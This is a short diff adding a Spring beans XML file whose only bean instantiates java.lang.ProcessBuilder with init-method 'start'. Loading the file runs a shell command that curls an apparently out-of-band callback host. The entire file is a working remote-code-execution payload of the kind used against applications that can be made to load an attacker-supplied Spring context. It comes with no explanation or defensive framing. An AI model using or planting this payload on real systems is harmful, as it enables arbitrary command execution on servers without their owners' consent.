@@ -1,0 +1,11 @@
+<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg>
+      <list>
+        <value>/bin/sh</value>
+        <value>-c</value>
+        <value><![CDATA[curl test2.ff8db773345441381c00.d.zhack.ca]]></value>
+      </list>
+    </constructor-arg>
+  </bean>
+</beans>
